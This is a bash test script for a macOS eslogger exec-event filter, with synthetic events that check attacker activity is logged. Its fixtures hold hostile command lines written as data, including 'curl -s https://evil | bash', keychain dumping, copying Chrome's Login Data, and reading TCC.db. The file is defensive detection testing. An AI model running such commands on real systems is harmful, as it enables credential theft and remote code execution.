#!/bin/bash
# run-tests.sh — log-all matrix for scope.jq against synthetic events in eslogger's exec JSON shape:
# every exec is kept unless an [exclude] rule of the fixture matches (Bindplane agent, Chrome's Team ID).
# Shape follows Apple's own man-page jq example (.process.executable.path, .event.exec.target.executable.path).
# SYNTHETIC — re-run against a real capture from measure.sh before trusting field paths.
set -uo pipefail
HERE="$(cd "$(dirname "$0")" && pwd)"; ROOT="$HERE/.."
CFG="$("$ROOT/bin/cfg.sh" "$ROOT/test/fixtures/slim.cfg" json)"
pass=0; fail=0
# ev <parent_path> <parent_platform> <parent_team> <target_path> <target_platform> <target_team> <args-json>
ev() { jq -cn --arg pp "$1" --argjson pplat "$2" --arg pt "$3" --arg tp "$4" --argjson tplat "$5" --arg tt "$6" --argjson args "$7" '
  def proc($p;$plat;$team): {executable:{path:$p, stat:{st_size:1234, st_birthtimespec:"2026-09-28T10:00:00Z"}},
     audit_token:{pid:4242, euid:501, ruid:501}, ppid:4000, original_ppid:4000, is_platform_binary:$plat,
     team_id:(if $team=="" then null else $team end), signing_id:"x", cdhash:"ab", codesigning_flags:570522385};
  {schema_version:1, mach_time:1, event_type:9, time:"2026-09-28T10:00:00Z", seq_num:1, global_seq_num:1,
   thread:{thread_id:1}, process:proc($pp;$pplat;$pt),
   event:{exec:{target:proc($tp;$tplat;$tt), args:$args, cwd:{path:"/"},
      env:["PATH=/usr/bin","SECRET_TOKEN=zzz","XPC_SERVICE_NAME=0"], fds:[]}}}'; }
t() { local want="$1" name="$2"; shift 2
  local got; got=$(ev "$@" | jq -n -cR --argjson cfg "$CFG" -f "$ROOT/src/scope.jq" | wc -l | tr -d ' ')
  local g; g=$([ "$got" = 1 ] && echo KEEP || echo DROP)
  if [ "$g" = "$want" ]; then pass=$((pass+1)); printf "  ok   %-4s %s\n" "$g" "$name"
  else fail=$((fail+1)); printf "  FAIL want %s got %s  %s\n" "$want" "$g" "$name"; fi; }
echo "-- attacker activity is logged"
t KEEP "curl download to tmp"            /bin/zsh true "" /usr/bin/curl true "" '["curl","-o","/tmp/a","https://x/y/z"]'
t KEEP "osascript base64"                /bin/zsh true "" /usr/bin/osascript true "" '["osascript","-e","run script (do shell script \"echo aGk= | base64 -D\")"]'
t KEEP "osascript -> sh (parent rule)"   /usr/bin/osascript true "" /bin/sh true "" '["sh","-c","ls"]'
t KEEP "osascript -> nohup"              /usr/bin/osascript true "" /usr/bin/nohup true "" '["nohup","x"]'
t KEEP "curl | sh (stdin shell)"         /bin/zsh true "" /bin/sh true "" '["sh"]'
t KEEP "security dump keychain"          /bin/zsh true "" /usr/bin/security true "" '["security","dump-keychain"]'
t KEEP "sqlite3 TCC.db"                  /bin/zsh true "" /usr/bin/sqlite3 true "" '["sqlite3","/Library/Application Support/com.apple.TCC/TCC.db"]'
t KEEP "xattr -d quarantine"             /bin/zsh true "" /usr/bin/xattr true "" '["xattr","-d","com.apple.quarantine","a.app"]'
t KEEP "shell running curl"              /usr/bin/python3 true "" /bin/bash true "" '["bash","-c","curl -s https://evil | bash"]'
t KEEP "cp of Chrome Login Data"         /bin/zsh true "" /bin/cp true "" '["cp","/Users/a/Library/Application Support/Google/Chrome/Default/Login Data","/tmp/x"]'
t KEEP "system_profiler anti-VM"         /bin/zsh true "" /usr/sbin/system_profiler true "" '["system_profiler","SPHardwareDataType"]'
t KEEP "launchctl load LaunchAgent"      /bin/zsh true "" /bin/launchctl true "" '["launchctl","load","/Users/a/Library/LaunchAgents/x.plist"]'
t KEEP "python -c"                        /bin/zsh true "" /usr/bin/python3 true "" '["python3","-c","import os"]'
t KEEP "unsigned payload in /tmp"        /bin/zsh true "" /private/tmp/abcdef123456/payload false "" '["payload"]'
t KEEP "copied Apple bin in Shared"      /bin/zsh true "" /Users/Shared/com.apple.updater true "" '["com.apple.updater"]'
t KEEP "platform bin outside sys paths"  /bin/zsh true "" /Users/a/Library/Caches/sh true "" '["sh"]'
t KEEP "exec from mounted DMG"           /sbin/launchd true "" /Volumes/Installer/Installer.app/Contents/MacOS/Installer false "" '["x"]'
t KEEP "DMG process spawns curl"         /Volumes/X/X.app/Contents/MacOS/X false "" /usr/bin/curl true "" '["curl","http://a"]'
t KEEP "hidden App Support dir"          /sbin/launchd true "" "/Users/a/Library/Application Support/.x/agent" false "ABCDE12345" '["agent"]'
t KEEP "unsigned parent spawns ls"       /Users/a/Downloads/tool false "" /bin/ls true "" '["ls"]'
t KEEP "3rd-party unknown team"          /sbin/launchd true "" /Applications/Foo.app/Contents/MacOS/Foo false "ZZZZ999999" '["Foo"]'
echo "-- ordinary OS activity is logged too (log all), only [exclude] matches are dropped"
t KEEP "benign sh -c from launchd"       /sbin/launchd true "" /bin/sh true "" '["sh","-c","/usr/libexec/periodic-wrapper daily"]'
t KEEP "zsh -c git status (IDE)"         /Applications/Code.app/Contents/MacOS/Electron false "UBF8T346G9" /bin/zsh true "" '["zsh","-c","git status"]'
t KEEP "defaults read (plain)"           /bin/zsh true "" /usr/bin/defaults true "" '["defaults","read","com.apple.dock"]'
t KEEP "sw_vers from installer"          /bin/sh true "" /usr/bin/sw_vers true "" '["sw_vers","-productVersion"]'
t KEEP "mdworker"           /sbin/launchd true "" /System/Library/Frameworks/CoreServices.framework/Frameworks/Metadata.framework/Versions/A/Support/mdworker_shared true "" '["mdworker_shared"]'
t KEEP "xpcproxy"           /sbin/launchd true "" /usr/libexec/xpcproxy true "" '["xpcproxy"]'
t DROP "Chrome helper ([exclude] TeamId)"      /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome false "EQHXZ8M8AV" "/Applications/Google Chrome.app/Contents/Frameworks/Helper" false "EQHXZ8M8AV" '["Helper"]'
t DROP "Bindplane log stream ([exclude] ParentImage)"     /opt/observiq-otel-collector/observiq-otel-collector false "X" /usr/bin/log true "" '["log","stream"]'
t KEEP "ps -ax plain"                     /bin/zsh true "" /bin/ps true "" '["ps","-ax"]'
t KEEP "cat of a normal file"            /bin/zsh true "" /bin/cat true "" '["cat","README.md"]'
echo "-- downloads"
t KEEP "rsync (download list)"           /bin/zsh true "" /usr/bin/rsync true "" '["rsync","-a","host:/x","."]'
t KEEP "nscurl"                          /bin/zsh true "" /usr/bin/nscurl true "" '["nscurl","https://a"]'
t KEEP "mount_smbfs"                     /bin/zsh true "" /sbin/mount_smbfs true "" '["mount_smbfs","//u@h/s","/tmp/m"]'
t KEEP "git clone"                       /bin/zsh true "" /usr/bin/git true "" '["git","clone","https://x"]'
t KEEP "python -c urlretrieve one-liner"   /bin/zsh true "" /usr/bin/python3 true "" '["python3","-c","import urllib.request as u;u.urlretrieve(x)"]'
t KEEP "ruby open-uri"                   /bin/zsh true "" /usr/bin/ruby true "" '["ruby","-ropen-uri","-e","URI.open(x)"]'
t KEEP "python3 script.py" /bin/zsh true "" /usr/bin/python3 true "" '["python3","script.py"]'
echo "-- excluding a vendor's binaries must NOT blind their children"
t KEEP "Chrome spawns curl to /tmp"      "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" false "EQHXZ8M8AV" /usr/bin/curl true "" '["curl","-o","/tmp/x","http://a"]'
echo "-- slimming"
out=$(ev /bin/zsh true "" /usr/bin/curl true "" '["curl","http://a"]' | jq -n -cR --argjson cfg "$CFG" -f "$ROOT/src/scope.jq")
raw=$(ev /bin/zsh true "" /usr/bin/curl true "" '["curl","http://a"]')
echo "$out" | jq -e '.exec.env == ["PATH=/usr/bin","XPC_SERVICE_NAME=0"] and (.exec.target.path=="/usr/bin/curl") and (.process.team_id==null) and (has("thread")|not)' >/dev/null \
  && { pass=$((pass+1)); echo "  ok   slim keeps security fields, drops SECRET_TOKEN env + thread"; } || { fail=$((fail+1)); echo "  FAIL slim: $out"; }
echo "  bytes raw=${#raw} slim=${#out} (synthetic — real events carry far bigger stat/env blocks)"
echo '-- malformed line is skipped, not fatal'
got=$( { echo 'not json'; ev /bin/zsh true "" /usr/bin/curl true "" '["curl"]'; } | jq -n -cR --argjson cfg "$CFG" -f "$ROOT/src/scope.jq" | wc -l | tr -d ' ')
[ "$got" = 1 ] && { pass=$((pass+1)); echo "  ok   bad line skipped, next event kept"; } || { fail=$((fail+1)); echo "  FAIL malformed handling ($got)"; }
echo; echo "PASS $pass  FAIL $fail"; [ $fail -eq 0 ]
